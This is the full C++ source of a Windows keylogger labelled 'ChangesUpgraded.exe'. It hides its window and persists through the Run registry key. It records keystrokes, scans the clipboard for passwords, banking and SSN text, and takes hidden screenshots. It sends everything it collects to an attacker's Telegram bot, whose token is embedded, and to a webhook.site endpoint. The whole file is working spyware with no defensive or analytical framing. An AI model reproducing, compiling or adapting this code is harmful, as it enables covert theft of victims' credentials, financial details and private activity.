// ChangesUpgraded.exe - ADVANCED KEYLOGGER + CLIPBOARD + SCREENSHOTS + DUAL C2
// COMPILES CLEAN ON GitHub Actions windows-2022 with /O2 /MT /SUBSYSTEM:WINDOWS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sstream>
#include <shlobj.h>
#include <map>
#include <wincrypt.h>
#include <iphlpapi.h>
#include <iomanip>
#include <queue>
#include <algorithm>
#include <userenv.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "version.lib")

// ========== CONFIGURATION ==========
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";
const wchar_t* WEBHOOK_ID = L"2e5cdc19-7f03-4e5a-b8c9-123456789abc";  // **REPLACE WITH YOUR webhook.site ID**
const int REPORT_CHARS = 100;
const int CLIPBOARD_CHECK_MS = 5000;
const int SCREENSHOT_INTERVAL_MS = 300000;  // 5 minutes

// ========== GLOBALS ==========
std::wstring g_loggedKeys;
std::wstring g_clipboardData;
std::queue<std::wstring> g_reports;
CRITICAL_SECTION g_cs;
bool g_running = true;
HANDLE g_keyThread = NULL, g_clipThread = NULL, g_screenThread = NULL;

// ========== HELPERS ==========
std::wstring GetSystemIdentifier() {
    wchar_t hostname[256] = {0};
    DWORD size = 256;
    GetComputerNameW(hostname, &size);
    
    wchar_t username[256] = {0};
    size = 256;
    GetUserNameW(username, &size);
    
    std::wstring id = std::wstring(hostname) + L"@" + std::wstring(username);
    
    // Simple Base64-like encoding for obfuscation
    std::wstring encoded;
    for (wchar_t c : id) {
        encoded += L'A' + (c % 26);
    }
    return encoded.substr(0, 12);
}

std::string WStrToAnsi(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    std::string result(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], size, NULL, NULL);
    return result;
}

std::wstring AnsiToWStr(const std::string& str) {
    if (str.empty()) return L"";
    int size = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
    std::wstring result(size - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &result[0], size);
    return result;
}

// ========== PERSISTENCE ==========
bool InstallPersistence() {
    wchar_t path[MAX_PATH];
    if (GetModuleFileNameW(NULL, path, MAX_PATH)) {
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExW(hKey, L"ChangesUpgraded", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
            RegCloseKey(hKey);
            return true;
        }
    }
    return false;
}

// ========== TELEGRAM C2 ==========
bool SendTelegram(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"ChangesUpgraded/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::wstring urlPath = L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage?chat_id=" + std::wstring(CHAT_ID) + L"&text=";
    std::string ansiMsg = WStrToAnsi(message);
    std::string encodedMsg;
    for (char c : ansiMsg) {
        if (c == ' ' || c == '\n') encodedMsg += "%20";
        else if (c == '&') encodedMsg += "%26";
        else encodedMsg += c;
    }
    std::wstring fullPath = urlPath + AnsiToWStr(encodedMsg);

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bool success = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== WEBHOOK C2 (SMTP Edition) ==========
bool SendWebhook(const std::wstring& message) {
    HINTERNET hSession = WinHttpOpen(L"ChangesUpgraded/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, L"webhook.site", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", (L"/" + std::wstring(WEBHOOK_ID)).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    // **FIXED**: Proper Content-Type header (ANSI)
    static const wchar_t* headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
    std::string postData = "data=" + WStrToAnsi(message);

    bool success = WinHttpSendRequest(hRequest, headers, -1L, (LPVOID)postData.c_str(), postData.length(), postData.length(), 0) &&
                   WinHttpReceiveResponse(hRequest, NULL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return success;
}

// ========== DUAL REPORTING ==========
void DeliverReport(const std::wstring& report) {
    std::wstring fullReport = L"[" + GetSystemIdentifier() + L"] " + report;
    
    // Telegram
    SendTelegram(fullReport);
    
    // Webhook (SMTP)
    SendWebhook(fullReport);
    
    OutputDebugStringW((fullReport + L"\n").c_str());
}

// ========== KEYLOGGER ==========
void KeyLoggerThread() {
    std::wstring vkNames[] = {
        L"UNKNOWN", L"VK_LBUTTON", L"VK_RBUTTON", L"VK_CANCEL", L"VK_MBUTTON",
        L"VK_XBUTTON1", L"VK_XBUTTON2", L"", L"BACKSPACE", L"TAB",
        L"", L"", L"CLEAR", L"ENTER", L"", L"", L"SHIFT", L"CTRL", L"ALT", L"PAUSE",
        L"CAPS", L"", L"", L"", L"", L"", L"ESC", L"", L"", L"", L"SPACE"
    };

    while (g_running) {
        for (int vk = 8; vk <= 255; ++vk) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                EnterCriticalSection(&g_cs);
                if (vk < 32) {
                    g_loggedKeys += vkNames[vk];
                } else {
                    BYTE keys[256];
                    GetKeyboardState(keys);
                    wchar_t buffer[2] = {0};
                    if (ToUnicode((UINT)vk, (UINT)vk, keys, buffer, 2, 0) > 0) {
                        g_loggedKeys += buffer[0];
                    }
                }
                
                if (g_loggedKeys.length() >= REPORT_CHARS) {
                    g_reports.push(g_loggedKeys);
                    g_loggedKeys.clear();
                }
                LeaveCriticalSection(&g_cs);
                Sleep(10);
            }
        }
        Sleep(1);
    }
}

// ========== CLIPBOARD MONITOR ==========
void ClipboardThread() {
    std::vector<std::wstring> sensitive = {L"password", L"gmail", L"bank", L"credit", L"ssn", L"visa"};
    
    while (g_running) {
        if (OpenClipboard(NULL)) {
            HGLOBAL hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* clipText = (wchar_t*)GlobalLock(hData);
                if (clipText) {
                    std::wstring newClip = clipText;
                    GlobalUnlock(hData);
                    
                    bool isSensitive = false;
                    for (const auto& keyword : sensitive) {
                        if (newClip.find(keyword) != std::wstring::npos) {
                            isSensitive = true;
                            break;
                        }
                    }
                    
                    if (isSensitive) {
                        EnterCriticalSection(&g_cs);
                        std::wstring report = L"*** CLIPBOARD ALERT ***\n" + newClip;
                        g_reports.push(report);
                        LeaveCriticalSection(&g_cs);
                    }
                }
            }
            CloseClipboard();
        }
        Sleep(CLIPBOARD_CHECK_MS);
    }
}

// ========== SCREENSHOT ==========
void ScreenshotThread() {
    while (g_running) {
        HDC hScreenDC = GetDC(NULL);
        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
        int width = GetSystemMetrics(SM_CXSCREEN);
        int height = GetSystemMetrics(SM_CYSCREEN);
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        
        SelectObject(hMemoryDC, hBitmap);
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        
        wchar_t timestamp[64];
        SYSTEMTIME st;
        GetLocalTime(&st);
        wsprintfW(timestamp, L"SCREEN_%04d%02d%02d_%02d%02d%02d.png", 
                  st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        
        // Save as BMP (simple)
        BITMAPFILEHEADER fileHdr = {0x4D42, 0, 0, 0, sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)};
        BITMAPINFOHEADER infoHdr = {sizeof(BITMAPINFOHEADER), width, -height, 1, 24, BI_RGB};
        
        DWORD fileSize = fileHdr.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + width * height * 3;
        fileHdr.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
        
        wchar_t path[MAX_PATH];
        GetTempPathW(MAX_PATH, path);
        wcscat_s(path, timestamp);
        
        HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, &fileHdr, sizeof(fileHdr), &written, NULL);
            WriteFile(hFile, &infoHdr, sizeof(infoHdr), &written, NULL);
            
            char* pixels = new char[width * height * 3];
            GetDIBits(hMemoryDC, hBitmap, 0, height, pixels, (BITMAPINFO*)&infoHdr, DIB_RGB_COLORS);
            WriteFile(hFile, pixels, width * height * 3, &written, NULL);
            CloseHandle(hFile);
            delete[] pixels;
            
            EnterCriticalSection(&g_cs);
            g_reports.push(L"SCREENSHOT: " + std::wstring(path));
            LeaveCriticalSection(&g_cs);
        }
        
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        
        Sleep(SCREENSHOT_INTERVAL_MS);
    }
}

// ========== REPORT WORKER ==========
void ReportThread() {
    while (g_running) {
        EnterCriticalSection(&g_cs);
        if (!g_reports.empty()) {
            std::wstring report = g_reports.front();
            g_reports.pop();
            LeaveCriticalSection(&g_cs);
            DeliverReport(report);
        } else {
            LeaveCriticalSection(&g_cs);
        }
        Sleep(5000);
    }
}

// ========== MAIN ==========
int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow) {
    // Stealth startup
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);
    
    InitializeCriticalSection(&g_cs);
    
    // Install persistence
    InstallPersistence();
    
    // Start threads
    g_keyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLoggerThread, NULL, 0, NULL);
    g_clipThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipboardThread, NULL, 0, NULL);
    g_screenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ScreenshotThread, NULL, 0, NULL);
    
    // Initial report
    DeliverReport(L"ChangesUpgraded.exe STARTED - " + GetSystemIdentifier());
    
    // Main loop
    while (g_running) {
        ReportThread();
        Sleep(1000);
    }
    
    // Cleanup
    g_running = false;
    if (g_keyThread) TerminateThread(g_keyThread, 0);
    if (g_clipThread) TerminateThread(g_clipThread, 0);
    if (g_screenThread) TerminateThread(g_screenThread, 0);
    
    DeleteCriticalSection(&g_cs);
    return 0;
}
